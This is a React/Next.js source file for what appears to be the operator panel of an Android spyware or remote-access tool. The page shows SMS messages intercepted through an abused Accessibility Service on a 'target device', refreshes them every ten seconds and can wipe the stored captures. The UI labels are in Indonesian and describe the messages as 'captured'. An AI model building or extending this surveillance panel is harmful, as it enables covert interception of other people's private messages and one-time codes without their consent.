'use client'
import { Suspense, useEffect, useState, useCallback } from 'react'
import Sidebar from '@/components/Sidebar'
import { useDevice } from '@/contexts/DeviceContext'
import { useBadge } from '@/contexts/BadgeContext'
import { MessageSquare, RefreshCw, Circle, Trash2, Bell } from 'lucide-react'

interface NotifEntry {
  id: number
  appPackage: string
  appName: string
  title: string
  text: string
  receivedAt: string
}

function SmsContent() {
  const { devices, selectedId, setSelectedId, connected } = useDevice()
  const { notifySmsCount, clearSmsBadge } = useBadge()
  const [entries, setEntries]   = useState<NotifEntry[]>([])
  const [loading, setLoading]   = useState(false)
  const [clearing, setClearing] = useState(false)
  const [limit, setLimit]       = useState('200')

  useEffect(() => { clearSmsBadge() }, [clearSmsBadge])

  const fetchSms = useCallback(async () => {
    if (!selectedId) return
    setLoading(true)
    try {
      const res = await fetch(
        `/api/device/notifications?deviceId=${encodeURIComponent(selectedId)}&type=sms&limit=${limit}`
      )
      const d = await res.json()
      const list: NotifEntry[] = d.entries ?? []
      setEntries(list)
      notifySmsCount(list.length)
      clearSmsBadge()
    } finally {
      setLoading(false)
    }
  }, [selectedId, limit, notifySmsCount, clearSmsBadge])

  // Auto-refresh tiap 10 detik saat connected
  useEffect(() => {
    if (!connected || !selectedId) return
    fetchSms()
    const t = setInterval(fetchSms, 10000)
    return () => clearInterval(t)
  }, [connected, selectedId, fetchSms])

  const clearAll = async () => {
    if (!selectedId) return
    setClearing(true)
    try {
      await fetch(`/api/device/notifications?deviceId=${encodeURIComponent(selectedId)}`, {
        method: 'DELETE',
      })
      setEntries([])
    } finally {
      setClearing(false)
    }
  }

  const fmt = (iso: string) => {
    try {
      return new Date(iso).toLocaleString('id-ID', {
        day: '2-digit', month: '2-digit',
        hour: '2-digit', minute: '2-digit',
      })
    } catch { return iso }
  }

  return (
    <div className="flex min-h-screen">
      <Sidebar connected={connected} devices={devices} selectedId={selectedId} onSelect={setSelectedId} />
      <main className="flex-1 page-content overflow-y-auto">
        <div className="max-w-4xl mx-auto px-3 md:px-6 py-4 md:py-6">

          {/* Header */}
          <div className="flex items-center justify-between mb-4">
            <div>
              <h2 className="text-lg md:text-xl font-bold text-white flex items-center gap-2">
                <MessageSquare size={20} className="text-android-green" />
                SMS Messages
              </h2>
              <p className="text-android-muted text-xs mt-0.5 flex items-center gap-1.5">
                <Bell size={10} />
                Ditangkap via Accessibility Notification — SMS masuk otomatis tercatat
              </p>
            </div>
            <div className={`flex items-center gap-1.5 text-xs font-medium px-2.5 py-1.5 rounded-full border ${
              connected
                ? 'text-android-green border-android-green/30 bg-android-green/10'
                : 'text-android-red border-android-red/30 bg-android-red/10'
            }`}>
              <Circle size={7} className={connected ? 'fill-android-green' : 'fill-android-red'} />
              {connected ? 'Online' : 'Offline'}
            </div>
          </div>

          {/* Controls */}
          <div className="flex gap-2 mb-4 flex-wrap">
            <select
              value={limit}
              onChange={e => setLimit(e.target.value)}
              className="bg-android-surface border border-android-border text-android-text text-xs rounded-lg px-3 py-2 outline-none"
            >
              <option value="50">Last 50</option>
              <option value="100">Last 100</option>
              <option value="200">Last 200</option>
              <option value="500">Last 500</option>
            </select>
            <button
              onClick={fetchSms}
              disabled={!connected || loading}
              className="flex items-center gap-2 px-4 py-2 bg-android-green text-android-bg rounded-lg text-sm font-semibold disabled:opacity-40 disabled:cursor-not-allowed"
            >
              {loading
                ? <RefreshCw size={14} className="animate-spin" />
                : <RefreshCw size={14} />}
              {loading ? 'Loading…' : 'Refresh'}
            </button>
            {entries.length > 0 && (
              <button
                onClick={clearAll}
                disabled={clearing}
                className="flex items-center gap-2 px-3 py-2 bg-android-red/10 border border-android-red/30 text-android-red rounded-lg text-sm font-semibold disabled:opacity-40"
              >
                <Trash2 size={14} />
                {clearing ? 'Menghapus…' : 'Hapus Semua'}
              </button>
            )}
          </div>

          {/* Empty states */}
          {!connected && (
            <div className="p-8 text-center text-android-muted text-sm bg-android-surface border border-android-border rounded-xl">
              <MessageSquare size={32} className="mx-auto mb-3 text-android-border" />
              Hubungkan perangkat untuk melihat SMS
            </div>
          )}

          {connected && entries.length === 0 && !loading && (
            <div className="p-8 text-center text-android-muted text-sm bg-android-surface border border-android-border rounded-xl">
              <Bell size={32} className="mx-auto mb-3 text-android-border" />
              <p className="font-medium text-android-text mb-1">Belum ada SMS tertangkap</p>
              <p className="text-xs text-android-muted">
                SMS masuk akan otomatis tercatat saat Accessibility Service aktif di perangkat target
              </p>
            </div>
          )}

          {/* SMS list */}
          {entries.length > 0 && (
            <div className="space-y-2">
              <p className="text-xs text-android-muted mb-2">{entries.length} pesan tertangkap</p>
              {entries.map(e => (
                <div
                  key={e.id}
                  className="bg-android-surface border border-android-border rounded-xl p-3 flex gap-3 border-l-2 border-l-android-green/50"
                >
                  <div className="shrink-0 pt-0.5">
                    <span className="text-[10px] font-bold px-2 py-0.5 rounded bg-android-green/10 text-android-green">
                      ▼ IN
                    </span>
                  </div>
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center justify-between mb-1 gap-2">
                      <span className="text-android-text text-sm font-semibold font-mono truncate">
                        {e.title || e.appName || e.appPackage}
                      </span>
                      <span className="text-android-muted text-[10px] shrink-0">{fmt(e.receivedAt)}</span>
                    </div>
                    <p className="text-android-muted text-sm break-words">{e.text}</p>
                    {e.appName && (
                      <p className="text-android-muted/50 text-[10px] mt-1 font-mono">{e.appName}</p>
                    )}
                  </div>
                </div>
              ))}
            </div>
          )}

        </div>
      </main>
    </div>
  )
}

export default function SmsPage() {
  return (
    <Suspense fallback={<div className="flex min-h-screen items-center justify-center text-android-muted text-sm">Loading…</div>}>
      <SmsContent />
    </Suspense>
  )
}
